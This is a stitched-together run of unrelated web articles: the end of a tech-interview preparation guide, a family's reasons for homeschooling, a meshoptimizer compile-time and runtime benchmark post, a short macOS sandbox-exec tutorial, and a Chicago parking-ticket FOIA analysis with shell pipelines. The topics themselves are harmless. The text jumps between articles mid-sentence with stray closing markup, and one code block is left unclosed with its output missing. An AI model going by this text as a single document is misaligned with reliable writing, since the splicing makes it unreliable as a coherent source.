<li>there might be an external factor that you can’t control; for example, you might not click with your interviewer, your interviewer might be having a bad day or
during the Hiring Committee review, someone dislikes something about your round even though all the interviewers gave you a positive score
(as an anecdote <a href="https://youtu.be/r8RxkpUvxK0?t=530">not even the Hiring Committee members are safe from themselves</a>).</li>
</ul>
<p>You increase your chances of landing a job at a top company if you interview with more of them. It may seem obvious, but it
took me some courage to attempt more times because I was afraid of rejection,
it helped to switch my mentality to focus more on the preparation rather than the result.</p>
<p>For stage fright, practice a lot either at pramp or with a friend experienced in interviews (highly recommended),
the more you practice, the better you’ll become at communicating your solution as well as keeping control of the time,
when I started, I could come up with a solution for a coding problem, but I’d present it in a disordered way, I’d explain a solution and start coding it right
away without realizing that I was solving the wrong problem or I’d talk too much without considering the time, and I’d eat valuable time in the interview that I could
use for the follow-up question or tests, when I practiced system design interviews, I’d jump across the system design
stages or I’d go way too deep into the detailed design when I talked about the high-level design. After I did enough mock
interview rounds with my friend, I corrected these problems and came up with a systematic way to tackle each coding and system design problem.</p>
<p>For challenging problems, always try to come up with examples. I got follow-up questions where I didn’t know where to start,
so after cycling through some data structures and algorithms I’d write some examples, I’d find a pattern, and finally,
the data structures and algorithms that would help me solve the problem. If you can’t make progress, ask for help! If you get
an excellent interviewer, he/she might realize you need help and give you hints but in any case, keep this step as a last resort when you’re completely stuck.</p>
<p>For external factors, there’s nothing you can do. Just focus your energy on the next interview instead of thinking about what you could’ve done better.</p>
<p>Finally, my journey wasn’t without failures. I failed multiple interviews with top companies, I was naive in the past, and when I decided to
go for an interview I’d “put all of my eggs in one basket” (meaning interviewing only with one company at a time in years) and fail but
now I realize that the interview process gave me invaluable information that helped me in my next attempts,
if you fail, it just means that you’ve failed that attempt. After all of your rounds, reflect on what you did right and wrong and focus on improving
that part for the next shot.</p>
<div>
<div>
<p><span>Luck</span> is what happens when <span>preparation</span> meets <span>opportunity</span></p>
<p><i>Seneca</i></p>
</div>
</div>
<p>Getting an offer is not the end of the journey. It might be possible that even after you reach your target company and you
work there for some years, you might look for new challenges in other top companies. The interview skill is something
that you should keep up to date. Good luck!</p>
<h2 id="summary">Summary</h2>
<p><em>(If you haven’t interviewed in the past and wanna get noticed)</em></p>
<ul>
<li>If you’re a student, enjoy the student lifestyle! Work on challenging projects that make you stand out from the rest.
In my case, I used to be a competitive programmer and was also really into creating my
projects for fun, <a href="https://javascriptweekly.com/issues/194">I managed to have a JS library featured in a magazine once!</a>,
(<a href="https://mauriciopoppe.github.io/PojoViz/public/vulcanize.html#readme">link to the project</a>).</li>
<li><a href="https://www.youtube.com/watch?v=ueNT-w7Oluw">Participate in Coding Contests</a>, I solved thousands of problems over the years;
my solutions are in <a href="https://github.com/mauriciopoppe/competitive-programming">this repo</a>.</li>
<li>Google has this website called <a href="https://foobar.withgoogle.com/">https://foobar.withgoogle.com/</a> (learn about it <a href="https://medium.com/plutonic-services/things-you-should-know-about-google-foobar-invitation-703a535bf30f">here</a>).
When I was reading about web performance, I saw a pink button somewhere inside the <a href="https://developers.google.com/web/fundamentals/performance/rendering">Web Fundamentals Rendering Performance Guides</a>
which led me to the foobar site, I solved 3 problems in python and got an interview invitation and then I solved the remaining 2 and got more invitations to give to friends.</li>
<li>If you are working full-time, look for opportunities to work on challenging problems and show leadership, <strong>take the chance, no pain, no gain</strong>.</li>
<li>Make sure your resume shines and aim for a 1-page resume, <a href="https://www.overleaf.com/read/fvdmbqtskgsw">here’s the CV I used for this round (with my details removed)</a>.</li>
</ul>
<p>Before looking to interview:</p>
<ul>
<li>Do the daily Leetcode challenge. It’s a great way to keep the coding interview skill up to date</li>
<li>Participate in Leetcode contests every Saturday, or Codeforces when it’s available</li>
<li>Read about or code scalable systems, read interesting papers and read the red book <a href="https://dataintensive.net/">Designing Data Intensive Applications</a>,
I focused a lot on this part since the last time I failed my previous onsite was because of system design.</li>
<li>Get to know me and the places I’d like to work, check if my values match the company core values</li>
</ul>

<div>
    <p>
        In the Facebook HQ you see their core values everywhere. One phrase that stuck with me in one of their buildings is <em>what would you do if you weren’t afraid?</em>.
A few of my friends have been working there for a long time, Facebook’s been one of my target companies for a while, <a href="https://engineering.fb.com/">their engineering blog</a> is filled with
so many gems across multiple fields. As a Frontend developer, I learned a lot from <a href="https://engineering.fb.com/web/browserlab-automated-regression-detection-for-the-web/">Browserlab</a>
whose infrastructure design I used as inspiration in a project I did at work with <a href="https://www.webpagetest.org/">WebPagetest</a>.
    </p>
</div>
<div>
    <p>
        I use a lot of Google products every day, and I admire their high quality. Google’s always setting standards in engineering in the industry
and ensuring that their research is available to the world. Many companies, including mine, have benefited from all the open-source projects they
produce/support. <a href="https://kubernetes.io/">Kubernetes</a> is the core component in many companies’ infra, and it looks like a magic box to the engineers that use it.
    </p>
</div>
<p>NOTE about picking your companies: I only interviewed with the companies I wanted to work for, which is risky. Another strategy is to apply to all the top
companies hoping to get multiple offers, which helps during the negotiation phase. During my preparation, I watched videos from various founders
from all of the top companies and discovered that I’d like to work at <a href="https://www.youtube.com/watch?v=NprBQi0cSHU">Stripe</a> too.</p>
<p>When I was ready to interview</p>
<ul>
<li>Contact the recruiters, schedule phone screens in 3 to 4 weeks. More time to prepare for the phone screen is risky
because I’ll burn out even before practicing the system design questions.</li>
<li>Practice only coding for the phone screens. The plan is detailed below.</li>
<li>After the phone screen interviews, schedule on sites in 4 to 6 weeks (I did 4 weeks), I also ensured that the onsites
were as close as possible to a target date with enough breathing room to rest.</li>
<li>Practice mainly system design and coding to a less extent, give yourself enough breathing room not to burn out.</li>
<li>Practice behavioral types of questions. Each company has its way to assess this part that’s described below.</li>
<li>Go through the onsites, get to a mental state where you’re ready for the next interview regardless of the outcome of the previous round.</li>
<li>Receive feedback from the recruiters and the HC, go through the team matching interviews if you passed the HC, remember that <strong>you don’t have an offer yet</strong>.</li>
<li>If you get offers, learn to negotiate, read <a href="https://candor.co/guides/salary-negotiation">Salary negotiation strategies everyone in tech already knows — but you don’t</a>, <a href="https://medium.com/@bayareabelletrist/how-i-negotiated-a-software-engineer-offer-in-silicon-valley-f11590f5c656">How I negotiated a $300,000 job offer in Silicon Valley</a>, and/or
get professional help.</li>
<li>If you don’t get an offer, learn from your mistakes, and move on, you’ll have enough time to reflect and think about the plan for the next attempt.</li>
</ul>
<h2 id="coding">Coding</h2>
<h3 id="phone-screen-preparation">Phone screen preparation</h3>
<ul>
<li>My phone screen preparation took 3 to 4 weeks, warmup for the 1st week: solve a few easy/medium problems in Leetcode, remember the STL (<a href="https://www.mauriciopoppe.com/notes/computer-science/programming-languages/cpp-refresher/">if your programming language is C++ I have a refresher article</a>).</li>
<li>Focus on breadth, a nice schedule based on your timeline can be found in the EPI book, then pick problems from your weakest area.</li>
<li>Practice EPI questions. I’ve already read EPI multiple times, so I just had to review their intro for each chapter’s STL methods and glance
through the problems and the solutions. To practice and test if your implementation works, use the <a href="https://github.com/adnanaziz/EPIJudge">EPI …</a></li></ul></article></div></div></div></section></div>

<p>My wife and I currently homeschool three of our four school-aged kids. We plan to ultimately homeschool all of our children for at least some portion of their early education, possibly through high school.</p>



<div><figure><img loading="lazy" width="640" height="360" src="https://173.199.178.7/wp-content/uploads/2018/12/public-school-buses-educating-children.jpg" alt="School Bus Kids to School or Teach Them at Home?" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/public-school-buses-educating-children.jpg 640w, https://prosperopedia.com/wp-content/uploads/2018/12/public-school-buses-educating-children-300x169.jpg 300w" sizes="(max-width: 640px) 100vw, 640px"></figure></div>



            <p>We often have had to defend our decision to homeschool over the past six years following our decision to take our kids out of the school system and teach them (more appropriately, create an environment for them to learn) in our home and in other family settings. Although the culture and attitude towards homeschooling are much different now than they were when I was in school in the 1980s and 90s, there is still a significant amount of stigma attached to scenarios where children are kept out of the normal school system. As I’ve done on many occasions responding to inquisitive people, I will explain why my wife and I chose to homeschool our children as an alternative to having them attend public schools, charter schools, or private schools, and why we continue with that educational approach after six years of doing so.</p>



<p>The decision we made in 2012 to break from the ranks of those parents who send their children off to school and enjoy 7-8 hours of free time (for stay at home moms; dads are usually away at work anyhow) meant that we’d need to take on an entire new career for both my wife and me. We added to our roles as parents, protectors, and providers for our kids the responsibility of being academic instructors for them as well, raising the stakes of what it means for us to be responsible for the development of each and all of our children.</p>



<h2><strong>Some Background About Us</strong></h2>



<p>My wife and I were educated in public schools. Both of us were involved in lots of activities that kept us busy nearly year round.</p>



<p>Throughout my grade school years, I wrestled and played baseball, football, basketball, and other sports. Although I have always enjoyed learning, I wasn’t a very serious student all the way through high school. I did make sure to do enough to keep my grades high because of my parents’ expectations, knowing in the back of my mind that it would someday be important for college, the place where careers were said to be made. I really enjoyed the social life. I loved the independence I found each morning as I headed off to school, checked in with all my buddies, flirted and hung out with the girls, and navigated life as a youth making his way toward adulthood.</p>



<div><figure><img loading="lazy" width="300" height="141" src="https://35.192.111.215/wp-content/uploads/2018/12/high-school-graduation-300x141.jpg" alt="" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation-300x141.jpg 300w, https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation-768x361.jpg 768w, https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation.jpg 953w" sizes="(max-width: 300px) 100vw, 300px"></figure></div>



<p>The public school systems in Florida/Utah (for me) and Texas (where my wife grew up) weren’t necessarily bad for us. I did get into more than my fair share of fights at school in Florida before my parents moved my family to Utah. I also remember watching lots of Andy Griffith reruns during chemistry classes, and I recall often getting permission from my physics teacher to skip class and head over to the school weight room to test out theories about gravity.</p>



<p>When I met and married my wife, I never recall her ditching on her public school education. She had good memories of cheerleading, friends, and striving for straight A’s.</p>



<p>After high school, we both attended college (where we met), and we both obtained college degrees. Based on that background, you might say that my wife and I are both pretty standard products of the American schooling system.</p>



<p>However, here we are, homeschool parents. </p>



<p>Here’s how that happened.</p>



<h2><strong>A Spiritual, Faith-Based Environment for Education</strong></h2>



<div><figure><img loading="lazy" width="640" height="426" src="https://173.199.178.7/wp-content/uploads/2018/12/spiritual-faith-based-education-important.jpg" alt="Spiritual, Faith-Based Education Important" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/spiritual-faith-based-education-important.jpg 640w, https://prosperopedia.com/wp-content/uploads/2018/12/spiritual-faith-based-education-important-300x200.jpg 300w" sizes="(max-width: 640px) 100vw, 640px"></figure></div>



<p>Just before my own graduation from Orem High School in 1994, I was asked by one of the officers of my senior class to give an “unofficial” prayer as we prepared to make our way into the civic center where we would listen to speeches and receive our diplomas. It seemed strange to me that we were not allowed to participate in a prayer as a part of the official proceedings, and that we had to sort of “sneak” one in prior to the graduation ceremony.</p>



<p>Since my graduation, I have become much more committed to religion, even more so as I became an imperfect parent needing divine direction to raise my children. My wife and I are a highly religious couple, which means that we have always considered education to be as much or more a spiritual matter as a secular one. </p>



<p>As we all well know, today’s public school system is no place for religion, no place for prayer, no place for scriptures. In contrast, my wife and I are certain that an education that attempts to instruct the mind without providing eternal perspective and training the heart and soul falls far short of its potential.</p>



<p><strong>One of the most important reasons we homeschool our kids is to instill in them our deeply held religious values.</strong></p>



<p>That one priority rules out public schools and charter schools, both of which are funded by tax dollars, which means that neither of those options is allowed to use a faith-based perspective for educating.</p>



<h2><strong>What About a Christian Private School?</strong></h2>



<p>When our oldest child was three years old, my wife and I decided to move a half hour away to the north part of our county specifically to be closer to a locally well-known Christian (LDS) private school called American Heritage School. We had toured the school and felt great about its commitment to solid religious and secular education as well as its emphasis on the principles of freedom promoted by the Founding Fathers of this country.</p>

<p>We enrolled our daughter in American Heritage School as a kindergartner, and she attended there for three years, including as a second grader while her younger brother, our oldest son, attended kindergarten. They both loved proudly wearing their school uniforms and going off to school each day.</p>



<p>In fact, we love the school so much that whenever we have a child ready to start school and enter kindergarten, we put him into American Heritage School. This gives them a chance to build some independence and experience the excitement of being part of a school community. &nbsp;Then, as has been our tradition, the following school year, we put them back into our homeschool system, where they learn beside their siblings and parents.</p>



<p>Despite how much we enjoyed American Heritage School, having our kids spend 7-8 hours a day, five days a week there didn’t fit our needs.</p>



<h2><strong>Building Family Relationships</strong></h2>



<p>My wife has been reading and telling me about a fascinating book called <a href="https://amzn.to/2RcuRMx"><em>Hold On To Your Kids: Why Parents Need to Matter More Than Peers</em></a>. The book details the dangers of peer orientation among youth and encourages affected parents to earn back their kids loyalty and love so that they don’t become victims of a peer group that severely damages their development and well-being.</p>



<p><a href="https://amzn.to/2RcuRMx"><em>Hold On To Your Kids </em></a>articulates well what we’ve felt motivated to do since our oldest started going to school. It is important to us as parents that our kids trust us, that they develop a close relationship with us as friends, mentors, and confidants. It is also important that they establish strong bonds among their siblings, so that they can continue to provide support for each other throughout their lives. The family unit is naturally that protective and nurturing shelter designed for giving kids their best chances at success.</p>



<p>My wife and I are both into sports. We love to play and watch football, baseball, basketball, and other sports. Our kids also naturally love sports, which means that we spend a lot of time at practices and games.</p>



<p>We also decided early on in our marriage that music would be a big component of our family. Each of our children begins learning a musical instrument by age six.</p>



<p>While my two oldest were attending American Heritage School, we found that we were simply short on time. We would send our kindergartner and 2nd grader to school for a large portion of the day, then having them practice their musical instruments, participate in sports, finish homework, and do chores, we found that there was simply too little time for us to spend with each of them before it was time for them to go to bed.</p>



<p>Often when people ask me why my kids are not “in school”, my reply is simply this: “We don’t have time for it.” </p>



<p>That may sound to some like a lame reason to keep kids out of school (especially a great, highly affordable private school), but really is a legitimate concern for a busy family. When our kids were in school, even one that we loved being associated with, their schedules were too full to allow us to have the critical time left over at the end of the day to develop important relationships between them and us as their parents.</p>

<p><span>Teaching kids at home can be done much more efficiently than in a classroom setting. Sending them off to a school where they are learning with 15 – 30 other kids whose interests and aptitudes vary widely simply cannot compete with the efficiency that’s possible with homeschooling. I’ve seen estimates that only one-third of the time (an average of about 6 hours per day across the nation) kids are at school is actually spend doing valuable learning activities. </span><a href="https://monkeymum.blog/2015/09/13/time-is-precious/"><span>One mom’s calculations estimate</span></a><span> puts actual instruction time spent in most classrooms at only 100 minutes (less than two hours) per day.</span></p>
<p><span>When kids are able to learn in an efficient way in the home, they can quickly work through what we consider mandatory, and they have more free time to spend with their siblings and parents as well as their friends. This has become more difficult for us as we’ve added more kids to the mix, and we are constantly looking for ways to watch and interact with the littlest ones while giving guidance, feedback, motivation, and discipline to our older ones. It helps that my career allows me to work from home and often step in to help my wife with her roles.</span></p>

17 Jan 2019

</span></p><p>A library that I work on often these days, <a href="https://github.com/zeux/meshoptimizer">meshoptimizer</a>, has changed over time to use fewer and fewer C++ library features, up until the current state where the code closely resembles C even though it uses some C++ features. There have been many reasons behind the changes - dropping C++11 requirement allowed me to make sure anybody can compile the library on any platform, removing <code>std::vector</code> substantially improved performance of unoptimized builds, removing <code>algorithm</code> includes sped up compilation. However, I’ve never quite taken the leap all the way to C with this codebase. Today we’ll explore the gamut of possible C++ implementations for one specific algorithm, mesh simplifier, henceforth known as <code>simplifier.cpp</code>, and see if going all the way to C is worthwhile.</p>

<!--more-->



<p>Mesh simplifier is an implementation of an edge collapse quadric based simplification algorithm with many tweaks to improve performance and quality of the result. The algorithm is still in development but has had a fair share of effort put into it. The details are really not that important, but it helps to understand the structure and size:</p>

<ul>
  <li>The entire algorithm is implemented in one standalone .cpp file that has almost exactly a thousand lines of code (1004 as of this writing), including comments, blank lines, lines with braces, etc.</li>
  <li>The algorithm almost exclusively uses heap-allocated arrays as data structures, using raw pointers for this</li>
  <li>The algorithm needs a hash table and a sorting routine, implemented from scratch</li>
</ul>

<p>We will look at several variations of the implementation, starting with one that uses C++ containers and algorithms that would be helpful for that algorithm, then remove one C++ feature at a time and measure compilation speed and runtime performance as we go on three compilers, gcc 7.3, clang 6 and msvc 2017 on Core i7-8700K running Windows 10 / Ubuntu 16.10. We’ll measure compilation performance by just compiling one .cpp file (with default options in debug and <code>-O2</code> optimization level in release), and measure runtime performance by simplifying <code>buddha.obj</code> (1M triangle mesh) to 25% of its size. After we reach the current implementation, we will explore the option of changing the code to pure C99.</p>

<blockquote>
  <p>Note that the way I arrived at these implementations is by taking the code you can see in the repository right now, and changing it to be more idiomatic Modern C++<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. However, these are generally very close to past versions of <code>simplifier.cpp</code> - the difference being that it’s possible to directly compare the variants now.</p>
</blockquote>



<p>The version we’re starting with is the original <code>simplifier.cpp</code> from <a href="https://github.com/zeux/meshoptimizer/blob/c93ba0987baa84bd73b61edf1c0ba7ba2e48df4b/src/simplifier.cpp">current meshoptimizer master</a>, with the following modifications:</p>

<ul>
  <li>All raw pointers changed to <code>std::vector</code></li>
  <li>Instead of a home-grown hash table we use <code>std::unordered_set</code></li>
  <li>Instead of a home-grown sorting routine we use <code>std::sort</code></li>
</ul>

<p>Here’s the performance that we’re getting as a result:</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>520 ms</td>
      <td>646 ms</td>
      <td>2273 ms</td>
      <td>572 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>400 ms</td>
      <td>684 ms</td>
      <td>2356 ms</td>
      <td>566 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>400 ms</td>
      <td>725 ms</td>
      <td>1535 ms</td>
      <td>584 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>422 ms</td>
      <td>566 ms</td>
      <td>36317 ms</td>
      <td>579 ms</td>
    </tr>
  </tbody>
</table>

<p>This is a good starting point. We can see that performance is pretty solid in release - 0.6 seconds to decimate 1M triangle mesh is a good level of performance - generally more or less reasonable in debug with a notable exception of MSVC (the adverse behavior of MSVC STL in debug mode was one of the forcing functions to remove all STL use from meshoptimizer), and compile times generally vary but are uninspiring.</p>

<p>To put the compile times in perspective, Jonathan Blow recently posted a <a href="https://youtu.be/iD08Vpkie8Q?t=4984">video stream with compiler performance improvements</a>, where his game engine and game written in his new language compile and link in about a second (compilation itself takes about 0.9 seconds). That’s on a codebase that has 100K lines of code - our algorithm only has 1K lines of code (excluding STL, of course - it’s not entirely fair to exclude STL, but it’s not entirely fair to include STL either since we know our algorithm can be implemented in 1K LOC without any STL dependencies). 400 ms is something you notice when compiling your code, even if it’s just one file, and something that makes me less happy when working on the code - given many files like that, cumulative compilation performance can be bad. This is given the fact that our implementation is pretty spartan about the STL dependencies - we only use three algorithms/containers. Let’s see what happens when we stop using one of them.</p>



<p>The secret about the previous version we benchmarked is that it never existed in that form. While meshoptimizer initially used STL containers and algorithms, it never used <code>std::unordered_set</code> - that’s because based on prior experience I expected the performance to be insufficient for the kinds of algorithms I wanted to write, and had a custom replacement that was using quadratic probing in a large power of two sized array, which is similar to Google’s <code>dense_hash_set</code> design. It’s a kind of hash table I use and implement often in different codebases for different applications, so I’m very familiar with it. The implementation in <code>simplifier.cpp</code> is just 35 lines of code<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, so it’s easy to drop in and adapt for the use case at hand. Let’s see what happens when we use that instead.</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>334 ms</td>
      <td>461 ms</td>
      <td>2054 ms</td>
      <td>460 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>270 ms</td>
      <td>517 ms</td>
      <td>2152 ms</td>
      <td>452 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>314 ms</td>
      <td>609 ms</td>
      <td>1179 ms</td>
      <td>415 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>361 ms</td>
      <td>461 ms</td>
      <td>28337 ms</td>
      <td>380 ms</td>
    </tr>
  </tbody>
</table>

<p>It looks like the extra 35 lines for a manual implementation of a better hash table were worth it. We’re seeing significant performance improvements across the board, in debug/release and both in terms of compile time and run time. The largest increase in runtime performance is on MSVC, we got 1.5x faster, and this is given the fact that hash table isn’t used as a core part of the algorithm - it’s only used to establish uniqueness relationship between individual vertices before the algorithm starts.</p>

<p>This highlights the poor fit of <code>std::unordered_set</code> to performance-critical workloads, especially ones that are insert-heavy. Unfortunately, this is not an implementation defect and thus is not possible to correct - the issue is that the standard requirements on unordered containers preclude more efficient implementations. Here’s to hoping that eventually we’ll get a better hash table in the standard.</p>



<p>At some point during development of the simplifier repeated profiling of various meshes showed that a lot of time is being spent in <code>std::sort</code>. Now, <code>std::sort</code> isn’t the fastest sorting algorithm, but it’s generally extremely competitive with custom implementations and it’s hard to beat without changing the problem around. In my case, sorting was used on an array of edge collapses, with the sort key being a floating point error value - so the natural instinct is to use a 3-pass radix sort, using 11, 11 and 10 bits of the key in each pass. However, there’s an interesting alternative available to us here - we can do radix sort in a single pass, using an 11 bit key<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>What happens is that we have a 32-bit non-negative floating point value; if we take the top 12 bits and ignore the topmost one (since that’s a sign bit and is always 0), we get 11 bits that represent 8 bits of exponent and 3 bits of mantissa, which essentially gives us a value of similar magnitude but a significant round-off error. If we sort using this value as a key, as a result the sorting sequence isn’t going to be perfectly ordered with respect to the full 32-bit key. However, in our case we need to sort to be able to process better edge collapses first based on a heuristic - and the heuristic is a gross approximation so the extra error our sorting introduces is not noticeable. This technique is surprisingly useful in other domains where you don’t necessarily need an exact order either. A benefit of a single-pass radix sort is that it’s faster (you only need to do one pass over the data instead of 3!) and simpler to implement than a full-blown radix sort, taking just 36 lines of code<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<p>This time the gains in compilation times are somewhat more modest. We’ve removed <code>&lt;algorithm&gt;</code> header but it doesn’t seem so have had very significant benefits to compilation time - we’re still including <code>&lt;vector&gt;</code> and it’s possible that large STL headers are pulled by both. However, the effects on performance are very significant, especially on debug performance in libstdc++ (most likely <code>std::sort</code> is very slow in debug there) but the gains in release builds are also exciting. What is not obvious from this graph is that sorting got so much faster that it almost completely disappeared from the profiles compared to the other work - the entire algorithm runs “just” 1.35x faster, but the gains measured on just the sorting code are much larger, 117 ms -&gt; 10 ms in release builds.</p>



<p>One number that we haven’t moved substantially yet is the time it takes to run this code in debug using MSVC. While it’s natural to expect unoptimized builds to be slower than optimized, they have to be fast enough. Sometimes you want to debug your problem on a non-trivial input dataset. Sometimes you want to run the debug build with full checks through your tests to make sure they don’t trigger any bugs that could disappear in release. Sometimes you are trying to debug a different part of the program, but you still need to run the rest of it. Programmers creatively come up with many workarounds that make the problem less severe - you can make special builds that enable some optimizations but not all, you can use mixed optimization settings for different projects, you can use <code>#pragma optimize</code> to temporarily disable optimizations around offending parts of the code - but all of these seem like duct-tape. Let’s try to replace the only STL component we’re still using, …</p></div></div>

        <article>
    
    <time>25th October 2020</time>
    <p>It isn’t widely advertised, but macOS ships with a standalone sandboxing utility out of the box: <code>sandbox-exec</code>. While the very short manpage says the utility has been marked deprecated, and for quite a few major releases now, it’s used heavily by internal systems so it’s unlikely go away anytime soon.</p>

<p>Sandbox configurations are writen in a subset of Scheme. A minimal useful starter example for wrapping a modern application might look something like this:</p>

<div><div><pre><code><span>(</span><span>version</span> <span>1</span><span>)</span>
<span>;; Disallow everything by default</span>
<span>(</span><span>deny</span> <span>default</span><span>)</span>

<span>;;</span>
<span>;; This system profile grants access to a number of things, such as:</span>
<span>;;</span>
<span>;;  - locale info</span>
<span>;;  - system libraries (/System/Library, /usr/lib, etc)</span>
<span>;;  - access to to basic tools (/etc, /dev/urandom, etc)</span>
<span>;;  - Apple services (com.apple.system, com.apple.dyld, etc)</span>
<span>;;</span>
<span>;; and more, see bsd.sb and system.sb in the corresponding directory.</span>
<span>;;</span>
<span>(</span><span>import</span> <span>"/System/Library/Sandbox/Profiles/bsd.sb"</span><span>)</span>
</code></pre></div></div>

<p>Saving the above as <code>config.sb</code>, you can use it to sandbox an app as follows:</p>

<div><div><pre><code><span>$ </span>sandbox-exec <span>-f</span> config.sb /Applications/Foo.app/Contents/MacOS/Foo
</code></pre></div></div>

<p>To see all the operations that were denied, open Applications → Utilities → Console and search for <code>sandbox</code> and the application name. Historically, you could use the <code>(trace "output")</code> command, but this seems dysfunctional on the latest macOS.</p>

<p>Most modern applications will not function with such limited permissions, so expect some back and forth before your sandbox profile works.</p>

<p>Depending on your OS version, you can find some system sandbox examples in some of the following locations:</p>
<ul>
  <li><code>/Library/Sandbox/Profiles</code></li>
  <li><code>/System/Library/Sandbox/Profiles</code></li>
  <li><code>/usr/share/sandbox</code></li>
</ul>

<p>The tool has virtually no official documentation so some hacker insight can come very handy. There’s a number of useful examples here:</p>
<ul>
  <li><a href="https://chromium.googlesource.com/chromium/src/+/master/sandbox/mac/seatbelt_sandbox_design.md" target="_blank" rel="noopener noreferrer">“Mac Sandbox V2 Design Doc” on chromium.googlesource.com</a></li>

</ul>

<p>Setting up a Sandbox from scratch can often be largely trial and error — disallow everything, and then follow the trail of errors to see what you need to enable as a bare minimum to make the app work.</p>

<p>On the upside, it’s a great way to gain insight into what closed source binaries are trying to do on your system.</p>

<h3>Intro</h3>

<p>This'll be my first blog post on the internet, ever. Hopefully it's interesting and accurate. Please point out any mistakes if you see any!</p>

<p>In 2016, I did some work in trying to find some hotspot areas for parking tickets to see if a bit of data munging could reduce those area's parking tickets. In the end, I only really got one cleaned up, but it was <em>one of</em> the most-ticketed spots in all of Chicago and led to about a 50% reduction in parking tickets.</p>

<p>Here's a bit of that story.</p>

<h3>Getting the data through FOIA:</h3>

<p>The system Chicago uses to store its parking tickets is called CANVAS. It's short for "City of Chicago Violation, Noticing and Adjudication Business Process And System Support" [sic] and managed by IBM.  Its most recent contract started in 2012, expires in 2022, and has a pricetag of over $190 million.</p>

<p>Most of Chicago's contracts and their Requests For Procurement (RFP) PDFs are published online. In CANVAS's contracts it gives a fair amount of info on CANVAS's backend infrastructure, including the fact that it uses Oracle 10g. In other words, a FOIA request can be fulfilled by IBM running some simple SQL. </p>

<p><a href="https://www.cityofchicago.org/content/dam/city/depts/dps/ContractAdministration/Specs/2011/Spec92488II.pdf">CANVAS Technical Spec</a>
<br><a href="https://data.cityofchicago.org/Administration-Finance/CANVAS/sbf2-65yk/data">CANVAS Contract</a>
<br><a href="http://ecm.cityofchicago.org/eSMARTContracts/service/DPSWebDocumentViewer?id={C8B55BB4-16F1-4941-B140-CAEA322CFFCD}&amp;osName=eContentContracts&amp;el=0&amp;image=image">CANVAS Request For Procurement (RFP) and Contract</a></p>

<p>With that information at hand, and a couple failed FOIA requests later, I sent this request to get the parking ticket data from Jan 1, 2009 to Mar 10, 2016:</p>

<p><em>"Please provide to me all possible information on all parking tickets between 2009 and the present day. This should include any information related to the car (make, etc), license plate, ticket, ticketer, ticket reason(s), financial information (paid, etc), court information (contested, etc), situational (eg, time, location), and photos/videos.  Ideally, this should also include any relevant ticket-related information stored within CANVAS.</em></p>

<p><em>[...]</em></p>

<p><em>This information will be used for data analysis for research.</em></p>

<p><em>Thanks in advance,</em></p>

<p><em>Matt Chapman"</em></p>

<h3>Data</h3>
<p>About a month later, a guy named Carl (in a fancy suit), handed me a CD with some <em>extremely</em> messy data in a semicolon delimited file named <code>A50462_TcktsIssdSince2009.txt</code>. The file had info on 17,806,818 parking tickets and spans from Jan 1, 2009 to Mar 10, 2016.</p>

<p>The data itself looks like this:</p>

<pre><code>head -5 A50462_TcktsIssdSince2009.txt

<h4>Some things to note about the data:</h4>

<ol>
<li>The file is semicolon delimited.</li>
<li>Each address is hand typed on a handheld device, often with gloves.</li>
<li>There are <em>millions</em> of typos in the address column. Including over 50,000 semicolons!</li>
<li>There is no lat/lon.</li>
</ol>

<p>What that amounts to is an extremely, extremely messy and unpredictable dataset that's incredibly to difficult to accurately map to lat/lon, which is needed for any sort of comprehensive GIS analysis.  There are a bunch of geocoder services that can help out here, but most of them have about a 50% accuracy rate. That said, with the help of a bit of scrubbing, that number can be boosted to closer to 90%. Another post for another time.</p>

<p>Here’s a sample list of Lake Shore Drive typos:</p>

<pre><code>Laks Shore Dr
Lawkeshore Dr West
Lkaeshore Dr
Lkae Shore Dr
Lkae Shore Drive
Lkaeshore Dr West
</code></pre>

<h3>Original Analysis</h3>

<p>I was particularly interested in finding areas that had hotspot areas that stood out. A lot of my time was spent just throwing hacky code at the problem and eventually wrote out two series of (hacky) commands that led to identifying a potentially fixable spot.</p>

<p>Originally, the work and analysis I was doing was with a combination of unix commands and gnuplot. Since then, I've migrated my code to python + matplotlib + SQL. But, for the sake of this blog, I wanted to show the original analysis.</p>

<p>Get count of tickets at addresses and ignoring first two digits:</p>

<pre><code>$ mawk -F';' '{print $7}' all_tickets.orig.txt
    | sed -r 's/^([0-9]*)[0-9][0-9] (.*)/\100 \2/'
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort | uniq -c | sort -nr

  79320 1900 W OGDEN
  <b>60059 1100 N STATE</b>
  50594 100 N WABASH
  44503 1400 N MILWAUKEE
  43121 1500 N MILWAUKEE
  43030 2800 N BROADWAY
  42294 2100 S ARCHER
  42116 1900 W HARRISON
</code></pre>

<p>Get count of tickets, by ticket type, at specific addresses:</p>

<pre><code>$ mawk -F';' '{print $9,$7}' A50462_TcktsIssdSince2009.txt
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort --parallel=4 | uniq -c | sort -nr

12510 EXPIRED PLATES OR TEMPORARY REGISTRATION 5050 W 55TH
 9636 PARKING/STANDING PROHIBITED ANYTIME 835 N MICHIGAN
 8943 EXPIRED PLATES OR TEMPORARY REGISTRATION 1 W PARKING LOT A
